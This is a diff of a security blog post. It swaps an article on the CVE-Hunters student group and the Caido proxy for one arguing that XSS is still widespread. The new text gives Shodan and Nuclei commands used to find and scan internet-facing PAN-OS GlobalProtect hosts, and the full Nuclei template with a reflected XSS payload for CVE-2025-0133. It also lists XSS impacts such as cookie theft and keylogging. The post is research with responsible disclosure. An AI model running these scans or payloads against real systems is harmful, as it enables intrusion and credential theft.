@@ -1,164 +1,198 @@
 ---
-title: Discovery of 51 CVEs - How Caido Helped Our Open Source Security Research
-description: Strengthening open source security through effective vulnerability detection
-date: 2025-06-04
+title: XSS Não Está Morto
+description: Uma análise prática sobre a exploração de XSS
+date: 2025-07-04
 weight: 100
-translationKey: "article-cvehuntersandcaido"
+translationKey: "article-xssnaoestamorto"
 image: cve-hunters+caido.png
 tags:
   - CVE-Hunters
-  - Caido tool
-  - Caido proxy
-  - Vulnerability research
-  - Web application security
-  - Responsible disclosure
-  - Open source vulnerabilities
-  - Security tools for pentesters
-  - Bug bounty tools
-  - Ethical hacking
-  - Burp Suite alternative
-  - CVE publication
-  - XSS detection
-  - IDOR vulnerability
-  - CSRF protection
-  - HTTPQL filtering
+  - XSS
+  - Pesquisa de vulnerabilidades
+  - Segurança de aplicações web
+  - Divulgação responsável
+  - Vulnerabilidades em código aberto
+  - Ferramentas de segurança para pentesters
+  - Ferramentas de bug bounty
+  - Hacking ético
+  - Detecção de XSS
 
 categories:
-  - Vulnerability Research
-  - Open Source Security
-  - Web Application Security
-  - Pentesting Tools
-  - Ethical Hacking Projects
-  - CVE Disclosure
-  - Cybersecurity Education
-  - Case Studies
+  - Pesquisa de Vulnerabilidades
+  - Segurança de Código Aberto
+  - Segurança de Aplicações Web
+  - Ferramentas de Pentest
+  - Projetos de Hacking Ético
+  - Divulgação de CVE
+  - Educação em Cibersegurança
+  - Estudos de Caso
+---
+### **1. introduction: "XSS? Still?"**
+
+In the middle of 2025, are we still talking about XSS? Yes, we still are. Even with the use of modern frameworks, intelligent WAFs and a plethora of articles explaining how to mitigate this threat, Cross-Site Scripting (XSS) is still present, sneaky, persistent and often overlooked.
+
+XSS is one of the first vulnerabilities covered in introductory courses on offensive security and web application penetration testing. With a simple payload, instructors demonstrate how trivial this flaw is to exploit, highlighting the danger and ease of its exploitation.
+
+But what is XSS anyway? According to [OWASP](https://owasp.org/www-community/attacks/xss/), Cross-Site Scripting attacks are a type of injection in which malicious scripts are inserted into vulnerable websites. These attacks occur when an attacker uses a web application to send malicious code, usually scripts executed in the browser, to another user. The flaws that make these attacks possible are quite common and arise whenever a web application incorporates user input into the generated output without carrying out appropriate validation or coding.
+
+Also according to OWASP, the victim's browser has no mechanism for distinguishing legitimate scripts from malicious ones. Thus, when it receives and executes the code, it trusts that it came from a secure source. As a result, the attacker can access cookies, session tokens and other sensitive information stored by the browser, as well as rewriting the content of the page or redirecting the user to malicious sites disguised as legitimate ones.
+
+![Simple example of an XSS payload to execute a message.](image.png)
+
+Simple example of an XSS payload to execute a message.
+
 ---
 
-##  Contributions from the CVE-Hunters Group using Caido
+### **2. CVE-Hunters vs XSS**
 
-<p style="text-align: justify;">Information security is a precious assistance to the design, installation, and ongoing updating of computer systems, especially for public, non-profit, or educational use. With cyber attacks and data breaches on the rise, never has it been more critical to improve the open-source project security.</p>
+The **CVE-Hunters** group was created in November 2024 as a joint initiative between students and a teacher, with a clear objective: to identify vulnerabilities (CVEs) in open source projects. The proposal was to give students practical experience in searching for flaws in real environments, going beyond controlled labs or Capture The Flag (CTF) challenges.
 
-<p style="text-align: justify;">Our group, CVE-Hunters, strives to find, research, and responsibly disclose vulnerabilities (CVEs) in widely used open-source software. We contribute to the global cybersecurity community by reporting CVEs, improving code security, and helping maintainers patch actual world security vulnerabilities before they become available for attack.</p>
+Since then, the group has analyzed a wide range of projects, from small community systems to applications widely used in the public and educational sectors. Along the way, one pattern has stood out: the frequency with which **Cross-Site Scripting (XSS)** vulnerabilities have been found.
 
-<p style="text-align: justify;">By on-job vulnerability research and live penetration testing, our program not only protects critical web applications but also provides hands-on training for the future generation of ethical hackers and cybersecurity experts. We try to foster a culture of active, open, and inclusive cybersecurity—allowing students and researchers to utilize state-of-the-art tools like Caido to perform simulated attacks, automate security testing, and facilitate secure development practices.</p>
+This recurrence raises an important question: have developers stopped treating XSS seriously enough? Despite being a widely documented and known flaw for years, it still appears frequently. Even in organizations with mature development processes, XSS vulnerabilities continue to appear due to the complexity of input and output flows, the use of legacy libraries or the lack of contextualized testing.
 
-## Project Objectives
+Currently, the group has **135 reported vulnerabilities**, **53 of which have already been officially registered as CVEs**. Of the total number of vulnerabilities discovered, 104 **are of the XSS type**, which represents a significant and worrying proportion.
 
-<p style="text-align: justify;">Our cybersecurity research is bounded by three core pillars underpinning technical excellence and societal responsibility:</p>
+![1.png](1.png)
 
-<p style="text-align: justify;">
-  <ul>
-    <li>Bolstering the security of commonly used open-source software with the discovery, verification, and support for remediation of real-world vulnerabilities. These core bugs—be they Cross-Site Scripting (XSS), Insecure Direct Object References (IDOR), or faulty authentication—may be exploited in production, exposing sensitive information.</li>
-    <li>Offering experiential cybersecurity training to future professionals through real-world vulnerability assessment projects. Students gain hands-on experience in bug discovery, secure code analysis, and ethical vulnerability disclosure using modern security testing tools like Caido, Burp Suite, and custom automation scripts.</li>
-    <li>Encouraging collaborative research and responsible CVE publication of Common Vulnerabilities and Exposures to facilitate awareness of developing threats, improve transparency, and assist with the continuous hardening of critical systems.</li>
-  </ul>
-</p>
+Sixty-two occurrences of the stored type and 42 of the reflected type were identified, revealing a relatively even distribution.
 
-## Case 1: WeGIA Platform
+![2.png](2.png)
 
-![](wegia.png)
+This statistic alone reinforces the idea that XSS is still a real problem, often overlooked during development, and that it continues to deserve attention, both from the technical community and from developers responsible for applications in production.
 
-<p style="text-align: justify;">One of the main targets of our security research was the WeGIA (Web Manager for Assistance Institutions) web application — an open-source web application to manage third-sector institutions in Brazil, including NGOs, social shelters, and nonprofit institutions. Such organizations are highly reliant on donations, volunteer support, and secure processing of data to function effectively.</p>
+---
 
-<p style="text-align: justify;">The security weaknesses that were discovered were among them critical ones such as unauthorized access, inadequate authentication processes, and data exposure vulnerabilities with considerable impact on confidentiality, integrity, and availability of sensitive information. In a fascinating collaborative pen testing challenge, CVE-Hunters community discovered, responsibly disclosed, and retried 48 security vulnerabilities (CVEs) in the WeGIA system. </p>
+### **3. Practical experience**
 
-<p style="text-align: justify;">Effective remediation and discovery of the security weaknesses made up the overall security status of the platform and facilitated long-term sustainability and trustiness of the software. This instance supports the necessity for constant vulnerability scanning and ethical hacking presence within the defense of open-source tools utilized in socially critical environments.</p>
+You may now be thinking: "OK, the CVE-Hunters group has found a lot of XSS in open source projects, but who's to say that large companies are also vulnerable?"
 
-## Case 2: i-Educar Platform
+Let's do a quick experiment, with one of the most recent XSS disclosed during the writing of this article: [**CVE-2025-0133 - PAN-OS: Reflected Cross-Site Scripting (XSS) Vulnerability in GlobalProtect Gateway and Portal**.](https://security.paloaltonetworks.com/CVE-2025-0133) An XSS reflected in the GlobalProtect gateway and portal products, features of Palo Alto Networks' PAN-OS, published on May 14, 2025.
 
-![](i-educar.png)
+With a simple query on Shodan, we can check the estimated amount of use of this product in the world. 
 
-<p style="text-align: justify;">Continuing our endeavor to promote the cybersecurity of critical digital infrastructure, our research team directed its focus on the i-Educar platform, a widely used open-source school management platform adopted by numerous public schools and institutions of learning in Brazil.</p>
+![image.png](image%201.png)
 
-<p style="text-align: justify;">i-Educar is designed to handle sensitive student data, including students' personal information, teachers' personal information, and learning histories. Thus, the platform becomes a premium target for any potential attackers and thus emphasizes the importance of securing it against future threats.</p>
+However, this doesn't mean that everyone is vulnerable. Let's go through the experiment for this article.
 
-<p style="text-align: justify;">During a professional application security audit, our team of researchers found other vulnerabilities in the i-Educar system. These included some authentication bypass, insecure exposure of data, and access controls that were improper in nature—both of which can potentially compromise educational information's confidentiality, integrity, and availability.</p>
+First, we extract some results from Shodan, a small sample of the total amount:
 
-<p style="text-align: justify;">To date, 3 of the vulnerabilities have been officially assigned CVE IDs and responsibly disclosed to the project maintainers following best practices for coordinated disclosure. The remaining findings are awaiting technical validation and documentation and will be submitted for CVE publication in the coming weeks.</p>
+```bash
+shodan search --fields hostnames 'http.title:"GlobalProtect Portal" port:443' | grep -v '^$' > globalprotect-hostnames.txt
+```
 
-<p style="text-align: justify;">This case study illustrates the importance of vulnerability research to the education community, especially when dealing with open-source platforms which have been storing personally identifiable information (PII). Securing i-Educar, we are committed to making it easier for a secure online community for schools and students.</p>
+![image.png](image%202.png)
 
-## Support Tool: Caido
+After that, we can use **`Nuclei`** to test for this vulnerability and automate the test:
 
-![](caido.webp)
+```bash
+nuclei -l globalprotect-hostnames.txt -t CVE-2025-0133.yaml
+```
 
-<p style="text-align: justify;">In our thorough web app security testing, Caido has been one of our go-to tools to discover, exploit, and document vulnerabilities. Created for pen testers, security researchers, and bug bounty hunters in mind, Caido is a contemporary and lightweight alternative to Burp Suite that provides a user-friendly interface without any loss of features.</p>
+![image.png](image%203.png)
 
-<p style="text-align: justify;">With functionalities tailored to ethical hacking and web application penetration testing, Caido enables efficient workflows in both manual and semi-automated testing environments. Caido's ability to intercept traffic, map the structure of sites, and manage enormous volumes of HTTP requests qualifies it to identify issues like XSS, CSRF, IDOR, authentication flaws, and insecure session ID management.</p>
+Template used for scanning [CVE-2025-0133](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-0133.yaml).
 
-<p style="text-align: justify;">Apart from its clean UI and smoothness, Caido's design is scalable—making it part of the best tools for security practitioners to look for an enterprise-level web vulnerability scanner and exploit tool in real-world engagements. Be it doing OWASP Top 10 testing or technical deep auditing, Caido is an integral component of an offensive security toolkit in the modern world.</p>
+```bash
+id: CVE-2025-0133
 
-### *Simple and functional interface*
+info:
+  name: PAN-OS - Reflected Cross-Site Scripting
+  author: xbow,DhiyaneshDK
+  severity: medium
+  description: |
+    A reflected cross-site scripting (XSS) vulnerability in the GlobalProtect™ gateway and portal features of Palo Alto Networks PAN-OS® software enables execution of malicious JavaScript in the context of an authenticated Captive Portal user's browser when they click on a specially crafted link.The primary risk is phishing attacks that can lead to credential theft—particularly if you enabled Clientless VPN.
+  reference:
+    - https://security.paloaltonetworks.com/CVE-2025-0133
+    - https://hackerone.com/reports/3096384
+  classification:
+    epss-score: 0.00102
+    epss-percentile: 0.29276
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query:
+      - http.favicon.hash:"-631559155"
+      - cpe:"cpe:2.3:o:paloaltonetworks:pan-os"
+    fofa-query: icon_hash="-631559155"
+    product: pan-os
+    vendor: paloaltonetworks
+  tags: hackerone,cve,cve2025,xss,panos,global-protect
 
-![](interface.png)
+http:
+  - raw:
+      - |
+        GET /ssl-vpn/getconfig.esp?client-type=1&protocol-version=p1&app-version=3.0.1-10&clientos=Linux&os-version=linux-64&hmac-algo=sha1%2Cmd5&enc-algo=aes-128-cbc%2Caes-256-cbc&authcookie=12cea70227d3aafbf25082fac1b6f51d&portal=us-vpn-gw-N&user=%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E&domain=%28empty_domain%29&computer=computer HTTP/1.1
+        Host: {{Hostname}}
 
-<p style="text-align: justify;">Caido has a minimal, modern, and user-friendly interface designed to ease the web application penetration testing process. Useful features such as a dynamic site map, full browsing history, and real-time interception of HTTP traffic allow security researchers to gain extensive visibility into the structure and operation of the targeted application.</p>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<script>prompt("XSS")</script>'
+          - 'authentication cookie'
+        condition: and
 
-<p style="text-align: justify;">These allow for faster and more precise identification of potential attack vectors, making Caido the solution of choice among professionals looking for an easy-to-use yet powerful platform for real-time request exploration, parameter inspection, and vulnerability detection. From endpoint mapping complex endpoints to analyzing live sessions, Caido optimizes the process without compromising depth or precision.</p>
+      - type: status
+        status:
+          - 200
+# digest: 490a0046304402202037be3477c0e16d7bb7cfb9874bf1cb6894a1d8035d64115db72607a539a54502203a1dac9b97514abef71fdb6a73d681f64f788f43605f2235f1fbfd26f6ddac2c:922c64590222798bb761d5b6d8e72950
+```
 
-### *Automation with "Automate"*
+We obtained a significant number of vulnerable hosts. Next, we tried to identify, among these results, any hosts that had a public VDP, so that we could notify them of the vulnerability. This step is a bit complex to do manually, so we used artificial intelligence to cross-reference the domains extracted from `Shodan` with information available on the internet about companies that have bug bounty programs or open VDPs.
 
-![](automate.png)
+During this research, we found only two domains with public VDPs - one a large private sector company, the other a government agency. Both are based in the United States: one with a VDP hosted on BugCrowd and the other with a private VDP, accessible via email.
 
-<p style="text-align: justify;">The "Automate" feature of Caido allows security professionals to configure and execute customized vulnerability scans with precision and velocity. It is specifically helpful in automating the detection of common web application vulnerabilities such as Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), Insecure Direct Object References (IDOR), and authentication or session management issues.</p>
+We reported both vulnerabilities to the companies responsibly.
 
-<p style="text-align: justify;">In supporting scripted test automation and payload injection for tailor-made payloads, Caido's Automate functionality slashes manual labor significantly but boosts precision in identifying security issues in complex web environments. It is an ideal addition for penetration testers and bug bounty hunters alike to enhance their web application security testing using automated, efficient scans tailored to their specific testing scope.</p>
+![image.png](image%204.png)
 
-### *Project management*
+![image.png](image%205.png)
 
-![](scopes.png)
+It is important to note that the sample tested represents only a fraction of the systems exposed. 
 
-<p style="text-align: justify;">Caido supports efficient penetration testing procedures through the capability to work on several projects simultaneously without having to restart the application. This kind of functionality is necessary for specialists with several web security tests to execute simultaneously, supporting easy switching between targets without jeopardizing information integrity.</p>
+### **5. More numbers**
 
-<p style="text-align: justify;">To make pentest campaign management even simpler, Caido has a full-featured Scopes feature. With it, users can effectively define, segment, and manage multiple testing scopes within one project. This proves useful to segment tests in terms of different domains, apps, or environments — improving organization, reducing noise, and supporting targeted vulnerability analysis.
-</p>
+If you're still not convinced by the amount of XSS we have out there, we can do another simple search in the *GitHub Advisory Database*  where we get a return of over **31,611 XSS-related occurrences**.
 
-<p style="text-align: justify;">By combining multi-project capability with scope-limited testing via environments, Caido keeps penetration testers, bug bounty hunters, and security researchers productive, effective, and concentrated on the most important bugs.</p>
+![XSS search in the GitHub Advisory Database](image%206.png)
 
-### *Filters with HTTPQL*
+XSS search in the GitHub Advisory Database
 
-![](filters.png)
+A search in the **CVE (Common Vulnerabilities and Exposures)** database also reveals a significant number of registered vulnerabilities related to XSS, demonstrating its recurrence in different systems, applications and contexts over the years.
 
-<p style="text-align: justify;">The Caido HTTPQL search engine provides for precise filtering and thorough examination of HTTP requests, even for heavy web traffic. As a security researcher and penetration tester, this concise and straightforward query language assists you in quickly navigating colossal sets of data without being an expert programmer.</p>
+![XSS search in Mitre's CVE database](image%207.png)
 
-<p style="text-align: justify;">With HTTPQL, advanced request filtering is made simpler to implement, and this accelerates the identification of security flaws such as injection points, authentication errors, and session irregularities, which makes it an essential utility for automated web traffic auditing and mass-scale vulnerability testing.</p>
+XSS search in Mitre's CVE database
 
-<p style="text-align: justify;">Caido also takes the lead in delivering cutting-edge features that make it stronger in real-world penetration testing and security auditing scenarios:</p>
+In addition, a search carried out on the **HackerOne** platform, widely recognized in the *Bug Bounty* ecosystem, results in a total of **2,225 public reports** involving Cross-Site Scripting vulnerabilities. This data reinforces not only the prevalence of XSS, but also the security community's continued interest in exploiting and reporting it, even in environments with high security standards.
 
-<p style="text-align: justify;">
-  <ul>
-    <li><b>Invisible proxy:</b> Conveniently captures and saves client and device network traffic that isn't supported by manual proxy configuration. This is especially helpful when testing embedded software, IoT devices, mobile apps, and blocked browsers for deep security analysis in otherwise hard-to-test cases.</li>
-    <li><b>DNS override:</b> Provides fine-grained control of domain name resolution during security testing to enable pentesters to spoof DNS, redirect traffic, and create realistic test cases. It is necessary to verify DNS-related vulnerabilities, perform phishing attacks, and analyze complex network attack vectors.</li>
-    <li><b>Browser integration:</b> Facilitates instantaneous inspection and dynamic inspection of HTTP/HTTPS traffic from modern web browsers, including those with strong reliance on JavaScript and dynamic content loading. The integration improves the efficiency of testing highly interactive web applications, single-page applications (SPA), and rich-client environments, which permit cross-site scripting (XSS), authentication problems, and other client-side attack detection.</li>
-  </ul>
-</p>
+![XSS research on the Bounty Hacker One Bug Platform.](image%208.png)
 
-## About the CVE-Hunters Group: Formation, Evolution and Mission
+XSS research on the Bounty Hacker One Bug Platform.
 
-![](repo.png)
+### **6. What can you do with an XSS besides alert(1)?**
 
-<p style="text-align: justify;">CVE-Hunters is a dedicated information security research group specializing in the discovery, analysis, and responsible disclosure of vulnerabilities in critical software applications. Founded in December 2024 by cybersecurity expert Professor <a href="https://www.linkedin.com/in/nmmorette" >Natan Morette</a>, the group started with just four passionate students eager to deepen their knowledge in offensive security and ethical hacking.</p>
+The famous alert(1) is often the first example used to demonstrate an XSS flaw.  However, the real impacts of this vulnerability go far beyond a simple alert window. Below, we list some classic and well-known malicious actions that can be carried out by an attacker when exploiting a Cross-Site Scripting flaw:
 
-<p style="text-align: justify;">Under the expert technical and ethical mentorship of Professor <a href="https://www.linkedin.com/in/nmmorette">Natan</a>, CVE-Hunters has steadily grown and matured. Today, we proudly count 10 active cybersecurity researchers who apply practical skills learned in both academic settings and hands-on lab environments. Our core focus areas include penetration testing, vulnerability assessment, CVE publication, and contributing to the security hardening of impactful open-source projects with significant social relevance.</p>
+- Cookie**theft** (if the cookie is not protected with the HttpOnly flag);
+- **Session hijacking**, assuming the victim's identity in authenticated applications;
+- **Keylogging**, capturing everything the user types on the compromised page;
+- **Malicious redirects** to fake pages, with the aim of applying scams;
+- **Performing actions on behalf of the user**, such as sending messages, changing settings or deleting data.
+- **Remote Code Execution**: although rare and depending on the specific context, it may be possible to gain remote access to the system from an XSS.
 
-<p style="text-align: justify;">Our research and development work is continuously evolving. We are actively analyzing new security flaws, documenting technical details, and preparing additional responsible vulnerability disclosures to the community.</p>
+These examples show that even though XSS is an often underestimated vulnerability, it can have serious consequences, especially when exploited in applications with sensitive data or with a high level of privilege for the affected user.
 
-<p style="text-align: justify;">To learn more about our team members, explore our ongoing projects, and follow the latest CVE publications, visit our official GitHub repository at: <a href="https://github.com/Sec-Dojo-Cyber-House/cve-hunters">https://github.com/Sec-Dojo-Cyber-House/cve-hunters</a>.</p>
+### **7. Conclusion**
 
-<p style="text-align: justify;">All identified vulnerabilities and officially published CVEs by CVE-Hunters are transparently catalogued and accessible on our official website: <a href="https://sec-dojo-cyber-house.github.io/">https://sec-dojo-cyber-house.github.io/</a>.</p>
+XSS is not dead, perhaps it has just been ignored in the face of new, more 'glamorous' threats. But its silent presence continues to offer an exploitable attack surface, often with critical impact.
 
-<p style="text-align: center;">“Security is a journey, not a destination.” <br>
-  <a href="https://github.com/Sec-Dojo-Cyber-House"><img src="sdch.png" width="120"/></a>
-</p>
+Despite often being classified as a vulnerability of *medium* or even *low* severity, **XSS should not be underestimated**. Its impact can be significant, especially when it involves stealing cookies, session hijacking or redirecting to malicious pages. And what's more dangerous: **traditional protections are not always enough to prevent the user from being tricked into clicking on that phishing site that is using a legitimate URL with an XSS vulnerability.**
 
-## Written by
+After all, XSS often depends on a single click, and in this scenario, **the weakest link is usually the user themselves**. It doesn't matter how robust your framework is or how well configured your WAF is: if the attacker manages to create a convincing malicious link, all it takes is one inattentive action by the victim for the attack to materialize.
 
-[![](/assets/contributors/50x50/elisangela50x50.png)](https://www.linkedin.com/in/elisangelasilvademendonca/) [Elisangela Mendonça](https://www.linkedin.com/in/elisangelasilvademendonca/)
+**While we rely on frameworks and WAFs, the attacker relies on our carelessness and the user's curiosity.**
 
-## Contributors
-
-[![](/assets/contributors/50x50/karina50x50.png)](https://www.linkedin.com/in/karina-gante/) [Karina Gante](https://www.linkedin.com/in/karina-gante/)
-
-[![](/assets/contributors/50x50/natan50x50.png)](https://www.linkedin.com/in/nmmorette) [Natan Maia Morette](https://www.linkedin.com/in/nmmorette) 
-
-> *By: [CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)*
+![image.png](image%209.png)
